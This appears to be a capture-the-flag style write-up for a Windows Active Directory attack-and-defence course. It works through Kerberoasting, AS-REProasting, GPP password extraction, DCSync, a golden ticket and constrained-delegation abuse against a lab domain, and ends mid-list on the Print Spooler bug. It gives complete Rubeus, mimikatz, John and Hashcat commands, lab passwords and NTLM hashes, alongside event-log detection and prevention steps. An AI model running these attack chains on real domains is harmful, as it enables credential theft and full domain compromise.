# WINDOWS ATTACKS & DEFENSE

## **Kerberoasting**

**Q1** Connect to the target and perform a Kerberoasting attack. What is the password for the svc-iam user?

### Objective

Perform a Kerberoasting attack to obtain crackable TGS tickets for a service account (`svc-iam`) in a Windows Active Directory environment and crack the password using a wordlist.

***

### Target

* **Windows Host:** `10.129.152.235` (ACADEMY-WINATTKDEF-WS01)
* **Domain:** `eagle.local`
* **Service Account:** `svc-iam`

***

### Step 1: Extract TGS Tickets Using Rubeus (Windows)

1. Open **PowerShell** on the target machine.
2. Run the following command to extract TGS tickets for `svc-iam`:

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fka14byJeQRHtgCCWHSNr%2FScreenshot%202025-09-11%20at%2010.14.04%E2%80%AFPM.png?alt=media&#x26;token=afb39c50-d822-46b2-b4c7-4c56e03cd152" alt=""><figcaption></figcaption></figure>

```powershell
.\Rubeus.exe kerberoast /outfile:C:\Users\bob\Downloads\spn.txt /user:svc-iam
```

* The output will generate a file `spn.txt` containing Kerberos TGS hashes.

***

### Step 2: Transfer `spn.txt` to Attacking Machine (Kali)

1. Use **SMBClient** to access the shared folder:

```bash
smbclient //10.129.152.235/Share -U eagle/administrator%Slavi123
```

2. Inside the SMB session, download `spn.txt`:

```smb
smb: \> get spn.txt
smb: \> exit
```

### Step 3: Prepare Wordlist

1. Ensure `rockyou.txt` is available and decompressed:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### Step 4: Crack TGS Hashes with John the Ripper

1. Run John the Ripper with the Kerberos TGS mode:

```bash
sudo john ~/spn.txt --fork=4 --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --pot=/home/htb-ac-2064122/results.pot
```

* `--fork=4` uses 4 CPU cores for faster cracking.
* `--format=krb5tgs` specifies Kerberos 5 TGS hash type.
* `--wordlist` points to your dictionary file.

2. After cracking, check recovered passwords:

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FznCTDB46apDBKRCAEKPp%2FScreenshot%202025-09-11%20at%2011.00.55%E2%80%AFPM.png?alt=media&#x26;token=2271b205-e4cb-44da-b9ea-8294c08448fe" alt=""><figcaption></figcaption></figure>

```bash
sudo john --show ~/spn.txt --pot=/home/htb-ac-2064122/results.pot
```

* This will display the plaintext password of the `svc-iam` account.

**Answer : mariposa**



**Q1** After performing the Kerberoasting attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the ServiceSid of the webservice user?

**Objective:**\
After performing the Kerberoasting attack, investigate Windows Event Logs to find the ServiceSid of the `webservice` account.

**Target:**

* Domain Controller: `DC1` (`172.16.18.3`)
* User: `htb-student`
* Password: `HTB_@cademy_stdnt!`

Filter the log by **Event ID 4769** (Kerberos Service Ticket Requested)

ptionally, filter by **ServiceName** if needed (e.g., `webservice`).

#### Step 3: Locate the ServiceSid

1. Find an event where `TargetUserName` requested a service ticket for `webservice`.
2. In the **Event Properties → Event Data**, locate the field `ServiceSid`.

**Example Event Data:**

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F1Y9eSj9zCUPfdrBicNZq%2FScreenshot%202025-09-11%20at%2011.12.27%E2%80%AFPM.png?alt=media&#x26;token=9fbbfb0e-ba1a-46ef-aa86-5b884cedb098" alt=""><figcaption></figcaption></figure>

```
TargetUserName: bob@EAGLE.LOCAL
ServiceName: webservice
ServiceSid: S-1-5-21-1518138621-4282902758-752445584-2110
IpAddress: 172.16.18.25
TicketEncryptionType: RC4_HMAC
```

**Answer : S-1-5-21-1518138621-4282902758-752445584-2110**

#### Notes

* Event ID 4769 is logged whenever a Kerberos service ticket is requested.
* Monitoring such events can help detect suspicious Kerberoasting attempts.
* Filtering by `ServiceSid` or `ServiceName` can help focus on high-value targets or honeypot accounts.

***

## AS-REProasting

### Overview

AS-REProasting is an Active Directory attack technique similar to **Kerberoasting**, but it targets **user accounts that have "Do not require Kerberos preauthentication"** enabled. The attack extracts crackable password hashes from these users, which can then be cracked using a dictionary attack.

**Target Domain:** `eagle.local`\
**Target Users:** `anni`, `svc-iam`

***

### Perform AS-REProasting with Rubeus

```powershell
.\Rubeus.exe asreproast /outfile:asrep.txt
```

**Sample output:**

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F2CE48BLw0XuMtTngW56S%2FScreenshot%202025-09-12%20at%2012.40.11%E2%80%AFPM.png?alt=media&#x26;token=1323ad3a-fd86-47db-9480-ad94bf9341d8" alt=""><figcaption></figcaption></figure>

```
[*] SamAccountName         : anni
[*] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt
```

3. Verify the output hash file:

```powershell
Get-Content C:\Users\bob\Downloads\asrep.txt
```

***

### Step 3: Transfer the Hash File to the Attacker Machine (Linux)

On the target (Windows):

```powershell
copy C:\Users\bob\Downloads\asrep.txt \\10.129.204.151\Share\asrep.txt
```

***

### Step 4: Crack the Hash Using Hashcat

1. Make sure you have a wordlist available:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
ls /usr/share/wordlists/rockyou.txt
```

2. Run Hashcat to crack the AS-REP hash:

```bash
sudo hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt --outfile asrepcrack.txt --force
```

3. Check the results:

```bash
sudo cat asrepcrack.txt
```

**Sample output:**

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FyCn1klu6hwFstvWgcoRH%2FScreenshot%202025-09-12%20at%201.04.57%E2%80%AFPM.png?alt=media&#x26;token=9f312223-dc49-4772-816c-f9f8815f6d58" alt=""><figcaption></figcaption></figure>

```
$krb5asrep$anni@eagle.local:...:shadow
```

Answer :  shadow

***

### Security Notes & Mitigation

* Regularly review accounts with **"Do not require Kerberos preauthentication"** enabled.
* Apply strong password policies (20+ characters) for these accounts.
* Deploy **honeypot users** to detect malicious hash extraction attempts.
* Monitor **Event ID 4768** in the Security log to track TGT requests and correlate suspicious activity.



**Q2** After performing the AS-REProasting attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the svc-iam user?

* Filter by **Event ID 4768** (Kerberos TGT request)
* Look for `TargetUserName = svc-iam`
* Get the **TargetSid** from the XML details

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FXr6XbUCl3zKPWjAyiu6x%2FScreenshot%202025-09-12%20at%201.56.40%E2%80%AFPM.png?alt=media&#x26;token=e5e7be94-480e-4f6f-8c52-0b229a2a8d1b" alt=""><figcaption></figcaption></figure>

**Answer : S-1-5-21-1518138621-4282902758-752445584-3103**



## GPP Passwords

**Q1** Connect to the target and run the Powersploit Get-GPPPassword function. What is the password of the svc-iis user?

### 1. Objective

* Learn how to attack Group Policy Preferences (GPP) to retrieve service account passwords.
* Use PowerSploit `Get-GPPPassword` to inspect XML files in SYSVOL.

***

### 2. Lab Environment

* Target Machine: `ACADEMY-WINATTKDEF-WS01` (10.129.204.151)
* Domain Controller (DC1): `172.16.18.3`
* User Accounts:
  * `bob` / `Slavi123` (for RDP)
  * `htb-student` / `HTB_@cademy_stdnt!` (for Event Log inspection)

***

### 3. Steps

#### 3.1 Connect to Target

```powershell
# RDP to the target machine
IP: 10.129.204.151
User: bob
Password: Slavi123
```

#### 3.2 Download and Prepare Module

* Download `Get-GPPPassword.ps1` to the machine:

```
C:\Users\bob\Downloads\Get-GPPPassword.ps1
```

* Check Execution Policy if scripts cannot run:

```powershell
# Set Execution Policy to allow running scripts
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```

***

#### 3.3 Import PowerSploit Module

```powershell
# Import the module
Import-Module .\Get-GPPPassword.ps1
```

***

#### 3.4 Run Get-GPPPassword

```powershell
# Retrieve the svc-iis password
Get-GPPPassword
```

* &#x20;output

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FDeYRZxLjFLxrexosRTWb%2FScreenshot%202025-09-12%20at%203.20.45%E2%80%AFPM.png?alt=media&#x26;token=761e7d4a-5757-413a-a5ec-092336d7593f" alt=""><figcaption></figcaption></figure>

```
UserName  : svc-iis
Password  : abcd@123
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\Machine\Preferences\Groups\Groups.xml
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```

**Result:**

* Username: `svc-iis`
* Password: `abcd@123`

**Answer : `abcd@123`**



**Q2** After running the previous attack, connect to DC1 (172.16.18.3) as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the Access Mask of the generated events?

#### Open Event Viewer

* Navigate: **Windows Logs → Security**
* Filter by **Event ID 4663** (Object Access)

#### 4.3 Check Access Mask

* Event 4663 generated by running `Get-GPPPassword` on Groups.xml:

```
Access Mask: 0x80
```

* Meaning: **Read Attributes** (reading file attributes)

***

### 5. Analysis

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FIKb3n0JFfecOhz42KZBa%2FScreenshot%202025-09-12%20at%203.38.59%E2%80%AFPM.png?alt=media&#x26;token=bcecab54-49a6-4497-a153-b83af2b4a30a" alt=""><figcaption></figcaption></figure>

| Item               | Detail                                                                           |
| ------------------ | -------------------------------------------------------------------------------- |
| Target File        | `C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml` |
| Accessed By        | `bob`                                                                            |
| Event ID           | 4663                                                                             |
| Access Mask        | 0x80 (Read Attributes)                                                           |
| Extracted Username | svc-iis                                                                          |
| Extracted Password | abcd@123                                                                         |

***

### 6. Prevention & Detection

* **Prevention**
  * Patch AD environment: KB2962486 (2014) → prevents storing passwords in GPP
  * Regularly review SYSVOL for credentials
* **Detection**
  * Audit access to XML files (Event ID 4663)
  * Monitor service account logons (Event ID 4624, 4625, 4768)
* **Honeypot**
  * Create dummy service accounts with incorrect passwords
  * Set alerts for any logon attempts → detect potential attackers



## GPO Permissions/GPO Files

### Overview

A **Group Policy Object (GPO)** is a collection of policy settings in Active Directory (AD) with a unique name. GPOs are used for centralized configuration management. Each GPO contains zero or more policy settings and is linked to an **Organizational Unit (OU)** to apply its settings to objects in that OU and its child OUs.

GPOs can be restricted to specific objects or groups:

* **AD Group filtering** (default: Authenticated Users)
* **WMI filter** (e.g., apply only to Windows 10 machines)

***

### Permission & Delegation Issues

* By default, only **Domain Admins** or equivalent privileged roles can modify a GPO.
* Problem arises when less privileged accounts are delegated GPO modification rights:
  * If `Authenticated Users` or `Domain Users` can be modified, a compromised user can change GPOs.
  * Modifications may include:
    * Adding **startup scripts**
    * Creating **scheduled tasks** to execute malicious files
* Misconfigured **network shares** can also allow file replacement, even if the GPO itself is correct.

***

### Attack Method

* Simple: **GPO edit** or **file replacement**.
* No complex exploitation needed.

***

### Prevention

1. **Lock down GPO permissions**
   * Only allow specific users/groups to modify GPOs.
   * Avoid granting access to all Domain Admins if the group is large.
2. **Avoid deploying files on shared locations**
   * Prevent multiple users from modifying files on network shares.
3. **Regularly review permissions**
   * Automate checks to detect deviations from expected permissions.
   * Schedule alerts for unexpected changes.

***

### Detection

* Enable **Directory Service Changes auditing**.
* Event ID **5136** is triggered when a GPO is modified:

```
Security log Event 5136: Administrator modified directory service object with GUID CN=31B2F340-016D-11D2-945F-00C04FB984F9
```

If an unexpected user modifies a GPO, raise a **red flag**.

### Honeypot GPO

* Purpose: Detect attackers abusing misconfigured GPOs.
* Guidelines:
  1. Link GPO to **non-critical servers only**.
  2. Continuous **automation** to monitor modifications:
     * Disable the user immediately if GPO is changed.
     * Unlink the GPO automatically from all locations.
  3. Use PowerShell to automate detection and response.

#### Example PowerShell Script

```
//# Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for Event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |
    Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email
    # Send-MailMessage
    $emailBody
}

```

Output

```
Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified
Disabled user bob
```

Disabling a user triggers **Event ID 4725**

```
Security log Event 4725: Administrator disabled user 'bob'.
```

### Key Takeaways

* Unauthorized GPO modification can compromise entire OUs.
* Always secure GPO permissions and network shares.
* Continuous **audit & monitoring** is essential.
* Honeypot GPOs can detect attackers, but require mature automation to avoid creating vulnerabilities.



## Credentials in Shares

### Objective

* Identify exposed credentials in network shares in an Active Directory (AD) environment.
* Extract passwords from files stored on network shares.
* Understand prevention, detection, and honeypot techniques.

***

### Step 1 — Prepare PowerShell

Open PowerShell and set the execution policy to allow scripts to run:

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```

### Step 2 — Import PowerView

PowerView is a PowerShell tool used to enumerate AD objects and network shares:

```
Import-Module .\PowerView.ps1
```

### Step 3 — Enumerate Network Shares

Use `Invoke-ShareFinder` to identify domain shares:

```
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
\\DC1.eagle.local\NETLOGON
\\DC1.eagle.local\SYSVOL
\\WS001.eagle.local\Share
\\Server01.eagle.local\dev$
```

### Step 4 — Access dev$ Share

```powershell
Push-Location "\\Server01.eagle.local\dev$"
```

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FM1i8PROAU9FR5oynn7hT%2FScreenshot%202025-09-12%20at%207.08.06%E2%80%AFPM.png?alt=media&#x26;token=fd7e9e85-ff8e-41d7-9574-668c3778072b" alt=""><figcaption></figcaption></figure>

### Step 5 — View Credential File

Open the file to extract credentials:

```powershell
type 2\4\4\Software\connect2.ps1
```

**Answer : Slavi920**

### Step 6 — Prevention

* Lock down share permissions; avoid using `Everyone` or loosely defined groups.
* Regularly scan shares for exposed credentials.
* Educate admins to avoid storing passwords in scripts.

***

### Step 7 — Detection

* Monitor user login patterns and unusual authentication events (Event IDs 4624, 4625, 4768).
* Detect abnormal connections from workstations to multiple servers.
* Implement alerts for access to sensitive files or shares.

***

### Step 8 — Honeypot Techniques

* Create fake accounts with incorrect passwords stored in files.
* Monitor for failed login attempts (4625, 4771, 4776).
* Useful to detect attackers scanning for exposed credentials

## Credentials in Object PropertiesStep 3: Create the Enumeration Script

Copy and paste the following function:

### Overview

In Active Directory (AD), user objects have multiple properties such as:

* Account status (Enabled/Disabled)
* Account expiration date
* Last password set date
* Username (SamAccountName)
* Office location and phone number

**Problem:**\
In the past, administrators sometimes stored passwords in the **Description** or **Info** fields, thinking only admins could view them. However, **any domain user can read most properties**, exposing sensitive credentials.

***

### Objective

* Enumerate user object properties to find clear-text credentials.
* Understand risks and preventive measures.
* Optionally, use a honeypot account for detection.

**Q1** Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?

***

### Step 1 Create the Enumeration Script

Copy and paste the following function

Function SearchUserClearTextInformation { Param ( \[Parameter(Mandatory=$true)] \[Array] $Terms,

```
    [Parameter(Mandatory=$false)]
    [String] $Domain
)

if ([string]::IsNullOrEmpty($Domain)) {
    $dc = (Get-ADDomain).RIDMaster
} else {
    $dc = (Get-ADDomain $Domain).RIDMaster
}

$list = @()
foreach ($t in $Terms)
{
    $list += "(`$_.Description -like `"*$t*`")"
    $list += "(`$_.Info -like `"*$t*`")"
}

Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
    Where { Invoke-Expression ($list -join ' -OR ') } |
    Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
    fl }
```

### Step 2: Run the Script

Search for users with the term `"pass"`:

```powershell
SearchUserClearTextInformation -Terms "pass"
```

Output

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2F8yfKO6LjArKm3vlRmiyY%2FScreenshot%202025-09-12%20at%209.47.48%E2%80%AFPM.png?alt=media&#x26;token=3c3a3db9-63cd-4756-9ac3-85fd03028939" alt=""><figcaption></figcaption></figure>

**Answer : Slavi1234**

**Q2** Using the password discovered in the previous question, try to authenticate to DC1 as the bonni user. Is the password valid?

**Answer : no**

**Q3** Connect to DC1 as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?

2. Open PowerShell and import the AD module:

```powershell
Import-Module ActiveDirectory
```

3. Retrieve SID of `bonni`:

```powershell
Get-ADUser bonni -Properties SID | Select-Object SamAccountName,SID
```

**Result**

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FTBzXOs0V2OiPQCenYcIk%2FScreenshot%202025-09-12%20at%209.57.30%E2%80%AFPM.png?alt=media&#x26;token=3b35e049-61bf-42b3-821e-e75018602ae7" alt=""><figcaption></figcaption></figure>

```
SamAccountName : bonni
SID            : S-1-5-21-1518138621-4282902758-752445584-3102
```

> This is the **TargetSid** of the `bonni` user.

***

### Step 7: Prevention and Recommendations

1. **Do not store passwords** in Description or Info fields.
2. Perform **continuous assessments** to detect exposed credentials.
3. **Educate administrators** about secure account management.
4. **Automate user creation** to reduce manual errors.
5. Use **behavior baselining** and monitoring to detect unusual logons.
6. Optionally, create **honeypot accounts** for detection purposes.

***

### Step 8: Detection (Optional)

* Monitor **Event IDs** for suspicious activity:
  * `4624` - Successful logon
  * `4625` - Failed logon
  * `4768` - Kerberos TGT requested
* Honeypot accounts often generate failed login events (`4625`, `4771`, `4776`) for attackers attempting to use fake passwords.



## DCSync

**Q1** Connect to the target and perform a DCSync attack as the user rocky (password:Slavi123). What is the NTLM hash of the Administrator user?

### Objective

Perform a **DCSync attack** using a user with replication permissions and obtain the NTLM hash of the `Administrator` account.

***

### Target

* **Host:** `10.129.204.151` (`ACADEMY-WINATTKDEF-WS01`)
* **Initial User:** `bob` / `Slavi123`
* **User for DCSync:** `rocky` / `Slavi123`
* **Domain:** `eagle.local`

***

### Tools

* **Mimikatz** (2.2.0 x64)

***

### Steps

#### 1. RDP to Target

* Connect to the target via RDP with `bob:Slavi123`.

#### 2. Open Command Prompt as `rocky`

```cmd
runas /user:eagle\rocky cmd.exe
```

* nter password: `Slavi123`
* A new command prompt will open with `rocky` credentials.

#### 3. Navigate to Mimikatz Folder

```cmd
cd C:\Mimikatz
```

#### 4. Run Mimikatz

```cmd
mimikatz.exe
```

#### 5. Elevate Privileges (Optional)

```mimikatz
privilege::debug
```

#### 6. Perform DCSync

```mimikatz
lsadump::dcsync /domain:eagle.local /user:Administrator
```

***

### Resultw

#### NTLM Hash of Administrator

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FGWWTcqvqFNNPgIMKg1IV%2FScreenshot%202025-09-12%20at%2010.41.38%E2%80%AFPM.png?alt=media&#x26;token=86e69b63-7008-405c-81af-577ad9acdcff" alt=""><figcaption></figcaption></figure>

```
fcdc65703dd2b0bd789977f1f3eeaecf
```

**Answer :  fcdc65703dd2b0bd789977f1f3eeaecf**

#### Supplemental Credentials

* Kerberos-Newer-Keys: aes256\_hmac, aes128\_hmac, des\_cbc\_md5
* NTLM-Strong-NTOWF

***

### Detection

**Q2** After performing the DCSync attack, connect to DC1 as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the Task Category of the events generated by the attack?

* Event ID: `4662` in **Security Logs**
* **Task Category:** `Directory Service Access`
* Monitored when a user replicates AD objects.
* Example from Event Viewer:

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FTvKF1AZzhX1BIIDBFgvc%2FScreenshot%202025-09-12%20at%2010.32.18%E2%80%AFPM.png?alt=media&#x26;token=e4c53560-e02b-4bde-878c-2bf00eef4409" alt=""><figcaption></figcaption></figure>

| Event ID | Task Category            | SubjectUserName | ObjectType |
| -------- | ------------------------ | --------------- | ---------- |
| 4662     | Directory Service Access | rocky           | DS Object  |

***

### Prevention

* Limit the following permissions to only required users:
  * `Replicating Directory Changes`
  * `Replicating Directory Changes All`
* Use RPC Firewalls or third-party solutions to control replication traffic.
* Monitor Event ID 4662 for abnormal replication attempts.

### Notes

* `/all` option in `lsadump::dcsync` dumps hashes of all accounts.
* Obtained NTLM hash can be used for **Pass-the-Hash attacks**.



## Golden Ticket

**Q1** Practice the techniques shown in this section. What is the NTLM hash of the krbtgt user?\
\


***

### Objectives

1. Retrieve the **NTLM hash** of the `krbtgt` account using DCSync
2. Obtain the Domain SID using PowerView
3. Generate a Golden Ticket with Mimikatz and inject it into the session (Pass-the-Ticket)
4. Verify the ticket (klist, access shares)
5. Summarize mitigation and detection strategies

***



#### 1) Run Mimikatz DCSync to extract `krbtgt`

1. Place `mimikatz.exe` on the lab machine (or use a privileged machine)
2. Open an elevated Command Prompt and run `mimikatz.exe`

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fo1WFFlPVAnnqLMNxbEaN%2FScreenshot%202025-09-13%20at%203.43.37%E2%80%AFPM.png?alt=media&#x26;token=ffaa796b-4a4a-40b0-97b3-15dba864abd3" alt=""><figcaption></figcaption></figure>

```
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```

* The output will display the `krbtgt` account credentials, including the **NTLM hash** and Kerberos keys (AES) if available
* Example (from the lab):

```
ntlm- 0: db0d0630064747072a7da3f7c3b4069e
```

**Answer :** db0d0630064747072a7da3f7c3b4069e



## Kerberos Constrained Delegation

***

**Q1** Use the techniques shown in this section to gain access to the DC1 domain controller and submit the contents of the flag.txt file.

### Overview

This lab demonstrates how to exploit Kerberos Constrained Delegation to escalate privileges in an Active Directory environment. We'll use a compromised service account with delegation privileges to impersonate high-privileged users and access restricted resources.

### Step-by-Step Attack

#### Step 1: Setup Environment

First, start PowerShell with execution policy bypass and import PowerView:

```powershell
powershell -exec bypass
Import-Module .\PowerView-main.ps1
```

#### Step 2: Enumerate Delegation-Configured Accounts

Use PowerView to find accounts trusted for delegation:

```powershell
Get-NetUser -TrustedToAuth
```

**Expected Output:**

```
logoncount                    : 25
badpasswordtime               : 1/1/1601 1:00:00 AM
distinguishedname             : CN=web service,CN=Users,DC=eagle,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : web service
lastlogontimestamp            : 12/17/2022 9:44:35 PM
userprincipalname             : webservice@eagle.local
name                          : web service
objectsid                     : S-1-5-21-1518138621-4282902758-752445584-2110
samaccountname                : webservice
msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1, http/DC1.eagle.local/EAGLE...}
serviceprincipalname          : {cvs/dc1.eagle.local, cvs/dc1}
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
```

**Key Findings:**

* `webservice` account is trusted for delegation
* Configured to delegate to HTTP service on DC1
* HTTP service enables PowerShell Remoting access

#### Step 3: Generate NTLM Hash

Convert the plaintext password to NTLM hash format required by Rubeus:

```powershell
.\Rubeus.exe hash /password:Slavi123
```

**Output:**

```
[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF
```

#### Step 4: Perform S4U Attack

Execute the Service-for-User (S4U) attack to obtain Administrator tickets:

```powershell
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```

**Attack Flow:**

1. **S4U2self**: Request TGS for Administrator to webservice
2. **S4U2proxy**: Convert to service ticket for Administrator to HTTP/DC1

**Expected Output:**

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fh4wzNlo0OCYRM3vlpvZY%2FScreenshot%202025-09-13%20at%208.45.56%E2%80%AFPM.png?alt=media&#x26;token=fa2465ae-7afa-40be-815e-81ec668f4b5a" alt=""><figcaption></figcaption></figure>

```
[*] Action: S4U
[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
[*] Building AS-REQ (w/ preauth) for: 'eagle.local\webservice'
[+] TGT request successful!
[*] Using domain controller: dc1.eagle.local (172.16.18.3)
[*] Building S4U2self request for: 'webservice@EAGLE.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'webservice@EAGLE.LOCAL'
[*] Impersonating user 'Administrator' to target SPN 'http/dc1'
[*] Building S4U2proxy request for service: 'http/dc1'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
```

#### Step 5: Verify Ticket Injection

Check that the Administrator ticket was injected into your session:

```powershell
klist
```

Look for entries showing:

```
Client: Administrator @ EAGLE.LOCAL
Server: http/dc1 @ EAGLE.LOCAL
```

#### Step 6: Access Target System

Use the injected ticket to access the domain controller:

```powershell
Enter-PSSession dc1
```

**Successful Connection:**

```
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami  
eagle\administrator
```

### Troubleshooting

#### Access Denied Error

If you get "Access is denied" when connecting:

1.  **Retry with correct parameter:**

    ```powershell
    # Use /ptt instead of /pt
    .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
    ```
2.  **Clear existing tickets:**

    ```powershell
    klist purge
    # Then retry the attack
    ```
3.  **Request multiple service tickets:**

    ```powershell
    .\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /altservice:cifs,ldap,host,rpcss /dc:dc1.eagle.local /ptt
    ```

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fc0dlNjnBTA6xQdsLpLnJ%2FScreenshot%202025-09-13%20at%208.45.34%E2%80%AFPM.png?alt=media&#x26;token=5046cac6-5351-41f6-931b-d5e159dd1cbf" alt=""><figcaption></figcaption></figure>

### Defense Strategies

#### Prevention

1.  **Configure sensitive accounts:**

    ```
    Account is sensitive and cannot be delegated
    ```
2. **Use Protected Users group:**
   * Add privileged accounts to Protected Users group
   * Automatically applies delegation protection
3. **Strong password policies:**
   * Use cryptographically secure passwords
   * Prevent Kerberoasting attacks
4. **Minimize delegation usage:**
   * Avoid delegation unless absolutely necessary
   * Regular audit of delegation configurations

#### Detection

1. **Monitor Event ID 4624:**
   * Look for unusual logon patterns
   * Alert on privileged users not from PAWs
2. **Check Transited Services attribute:**
   * S4U logons may populate this field
   * Example: `webservice@EAGLE.LOCAL`
3. **Behavioral analysis:**
   * Correlate user location and time patterns
   * Alert on suspicious authentication sources

### Key Takeaways

* **Any delegation is risky:** Treat delegation-configured accounts as highly privileged
* **Protocol transition:** Can delegate to services not explicitly configured (HTTP → CIFS/LDAP)
* **Defense in depth:** Multiple layers of protection needed
* **Monitoring crucial:** Behavioral analysis is key to detecting abuse



## Print Spooler & NTLM Relaying



### Description

The **Print Spooler** service is enabled by default on most Windows Desktop and Server versions. In 2018, Lee Christensen discovered the **PrinterBug**, which abuses the RPC functions:

* `RpcRemoteFindFirstPrinterChangeNotification`
* `RpcRemoteFindFirstPrinterChangeNotificationEx`

This bug allows a remote machine to force another machine to authenticate to a target system, carrying authentication information (TGT). Any domain user can coerce a machine to authenticate to another system.

#### Impact

If exploited on a Domain Controller with the Print Spooler enabled, an attacker can:

1. Relay the connection to another DC and perform **DCSync** (if SMB Signing is disabled).
